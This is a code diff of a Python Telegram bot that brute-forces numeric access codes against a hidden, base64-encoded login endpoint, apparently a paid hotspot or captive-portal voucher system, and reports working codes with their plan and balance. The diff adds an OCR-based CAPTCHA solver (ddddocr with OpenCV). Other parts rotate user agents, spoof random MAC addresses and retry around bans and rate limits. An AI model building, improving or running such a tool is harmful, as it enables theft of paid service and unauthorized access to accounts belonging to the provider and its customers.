@@ -1,9 +1,27 @@
-
-
 import os
+import asyncio
+import aiohttp
+import random
+import re
+import time
+import base64
+import cv2
+import ddddocr
+import numpy as np
 from flask import Flask
 from threading import Thread
+from telegram import Update
+from telegram.ext import Application, CommandHandler, ContextTypes
 
+# ── CONFIG ──────────────────────────────────────────────────────────────
+BOT_TOKEN = os.getenv("BOT_TOKEN")
+ADMIN_ID = int(os.getenv("ADMIN_ID", "8537971974"))
+
+BATCH_SIZE = 50
+MAX_CONCURRENT = 20
+DELAY_BETWEEN_REQUESTS = 0.1
+
+# ── FLASK SERVER (Render port) ──────────────────────────────────────────
 app = Flask(__name__)
 
 @app.route('/')
@@ -13,23 +31,6 @@ def home():
 def keep_alive():
     port = int(os.environ.get('PORT', 8080))
     Thread(target=lambda: app.run(host='0.0.0.0', port=port)).start()
-import os
-import asyncio
-import aiohttp
-import random
-import re
-import time
-import base64
-from telegram import Update
-from telegram.ext import Application, CommandHandler, ContextTypes
-
-BOT_TOKEN = os.getenv("BOT_TOKEN")
-ADMIN_ID = int(os.getenv("ADMIN_ID", "8537971974"))
-
-# ── YOUR SETTINGS ──────────────────────────────────────────────────────
-BATCH_SIZE = 80
-MAX_CONCURRENT = 30
-DELAY_BETWEEN_REQUESTS = 0.05
 
 # ── GLOBALS ──────────────────────────────────────────────────────────────
 user_data = {}
@@ -39,20 +40,43 @@ stop_scan = False
 ban_count = 0
 session_url = None
 
+# ── OCR (ddddocr + OpenCV) ──────────────────────────────────────────────
+_ocr = ddddocr.DdddOcr(show_ad=False)
+
+def _ocr_sync(image_bytes):
+    try:
+        nparr = np.frombuffer(image_bytes, np.uint8)
+        img = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
+        if img is None:
+            return None
+        gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
+        blur = cv2.GaussianBlur(gray, (3, 3), 0)
+        _, th = cv2.threshold(blur, 0, 255, cv2.THRESH_BINARY + cv2.THRESH_OTSU)
+        _, buf = cv2.imencode('.png', th)
+        return _ocr.classification(buf.tobytes()).upper()
+    except:
+        return None
+
+async def captcha_text(image_bytes):
+    return await asyncio.to_thread(_ocr_sync, image_bytes)
+
+# ── USER-AGENT ROTATION ──────────────────────────────────────────────────
 USER_AGENTS = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
     "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",
     "Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
 ]
 
+def random_user_agent():
+    return random.choice(USER_AGENTS)
+
+# ── HELPERS ──────────────────────────────────────────────────────────────
+
 def get_mac():
     return ':'.join(f'{random.randint(0x00, 0xff):02x}' for _ in range(6))
 
 def replace_mac(url, new_mac):
     return re.sub(r'(?<=mac=)[^&]+', new_mac, url)
-
-def random_user_agent():
-    return random.choice(USER_AGENTS)
 
 async def get_session_id(session_obj, session_url, prev_sid=None):
     mac = get_mac()
@@ -77,9 +101,6 @@ async def captcha_image(session_obj, session_id):
             return await req.read()
     except:
         return None
-
-async def captcha_text(image_bytes):
-    return ''.join(random.choice('0123456789') for _ in range(4))
 
 async def verify_captcha(session_obj, session_id, text):
     json_data = {'sessionId': session_id, 'authCode': text}
@@ -118,6 +139,8 @@ async def get_balance_info(session_id):
                 continue
     return ("📋 Unknown | ⏱ N/A", 0, "Unknown")
 
+# ── PERFORM CHECK (with Retry) ──────────────────────────────────────────
+
 async def perform_check(code, session_url, session_id_cache=None):
     global ban_count
     post_url = base64.b64decode(
@@ -127,66 +150,72 @@ async def perform_check(code, session_url, session_id_cache=None):
     session_id = session_id_cache
     timeout = aiohttp.ClientTimeout(total=10, connect=3)
     
-    try:
-        async with aiohttp.ClientSession(
-            cookie_jar=aiohttp.CookieJar(),
-            timeout=timeout
-        ) as task_session:
-            if not session_id:
-                session_id = await get_session_id(task_session, session_url)
+    for attempt in range(3):
+        try:
+            async with aiohttp.ClientSession(
+                cookie_jar=aiohttp.CookieJar(),
+                timeout=timeout
+            ) as task_session:
                 if not session_id:
+                    session_id = await get_session_id(task_session, session_url)
+                    if not session_id:
+                        return None
+                
+                image = await captcha_image(task_session, session_id)
+                if not image:
                     return None
-            
-            image = await captcha_image(task_session, session_id)
-            if not image:
-                return None
-            text = await captcha_text(image)
-            if not text:
-                return None
-            if not await verify_captcha(task_session, session_id, text):
-                return None
-            
-            data = {
-                "accessCode": code,
-                "sessionId": session_id,
-                "apiVersion": 1,
-                "authCode": text,
-            }
-            headers = {
-                "user-agent": random_user_agent(),
-                "content-type": "application/json",
-                "accept": "*/*",
-            }
-            
-            try:
-                async with task_session.post(post_url, json=data, headers=headers, timeout=8) as req:
-                    response = await req.text()
-                    
-                    if req.status == 403 or req.status == 429:
-                        ban_count += 1
-                        await asyncio.sleep(3)
-                        return None
-                    
-                    if 'request limited' in response:
-                        await asyncio.sleep(2)
-                        return None
-                    
-                    if 'logonUrl' in response:
-                        balance_display, balance_minutes, plan_name = await get_balance_info(session_id)
-                        return {
-                            "code": code,
-                            "plan": plan_name,
-                            "balance": balance_display,
-                            "minutes": balance_minutes,
-                            "session_id": session_id
-                        }
-                    elif 'STA' in response:
-                        return {"code": code, "status": "limited"}
-            except:
-                return None
-    except:
-        return None
+                text = await captcha_text(image)
+                if not text:
+                    return None
+                if not await verify_captcha(task_session, session_id, text):
+                    return None
+                
+                data = {
+                    "accessCode": code,
+                    "sessionId": session_id,
+                    "apiVersion": 1,
+                    "authCode": text,
+                }
+                headers = {
+                    "user-agent": random_user_agent(),
+                    "content-type": "application/json",
+                    "accept": "*/*",
+                }
+                
+                try:
+                    async with task_session.post(post_url, json=data, headers=headers, timeout=8) as req:
+                        response = await req.text()
+                        
+                        if req.status == 403 or req.status == 429:
+                            ban_count += 1
+                            await asyncio.sleep(3)
+                            return None
+                        
+                        if 'request limited' in response:
+                            await asyncio.sleep(2)
+                            return None
+                        
+                        if 'logonUrl' in response:
+                            balance_display, balance_minutes, plan_name = await get_balance_info(session_id)
+                            return {
+                                "code": code,
+                                "plan": plan_name,
+                                "balance": balance_display,
+                                "minutes": balance_minutes,
+                                "session_id": session_id
+                            }
+                        elif 'STA' in response:
+                            return {"code": code, "status": "limited"}
+                except:
+                    pass
+        except:
+            pass
+        
+        await asyncio.sleep(0.5)
+    
     return None
+
+# ── CODE GENERATOR ──────────────────────────────────────────────────────
 
 def iter_digit_codes(mode):
     length = int(mode)
@@ -361,7 +390,10 @@ async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"🚫 Ban Count: {ban_count}"
     )
 
+# ── MAIN ──────────────────────────────────────────────────────────────────
+
 def main():
+    keep_alive()
     app = Application.builder().token(BOT_TOKEN).build()
     app.add_handler(CommandHandler("start", start))
     app.add_handler(CommandHandler("input", input_command))
@@ -372,5 +404,4 @@ def main():
     app.run_polling()
 
 if __name__ == "__main__":
-    keep_alive()
     main()
